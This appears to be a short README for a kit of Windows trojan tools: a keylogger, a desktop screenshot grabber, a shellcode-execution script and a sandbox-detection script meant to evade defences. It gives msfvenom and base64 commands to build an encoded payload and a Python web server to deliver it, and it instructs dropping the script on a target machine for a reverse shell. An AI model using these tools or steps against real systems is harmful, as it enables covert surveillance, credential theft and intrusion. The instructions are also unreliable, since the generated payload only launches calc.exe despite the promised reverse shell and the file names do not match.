# Windows Trojans for common tasks. Here you'll find a keylogger tool, tools to take screenshots of the user's desktop environment, shell code execution and sendbox detection.

- Keylogger.py

C:\user\admin>python Keylogger.py

- Screenshotter.py

C:\user\admin>python Screenshotter.py

- shell_exec.py

#First create a payload with msfvenom then we base64 encode it. After you did all that you are ready to start a python3 server  

msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shallcode.raw

base64 -w 0 -i shellcode.raw > shellcode.bin

python3 -m http.server 8000

Drop the shell_exec.py on the Windpws target machine and execut it
If all goes well youl'll be presented with a reverse TCP shell back to your framework 

- sandbox_detec.py

You must do your bes to avoide tiping any defense in place. You can use this script to determine if the target machine is executing within a sandbox environment.

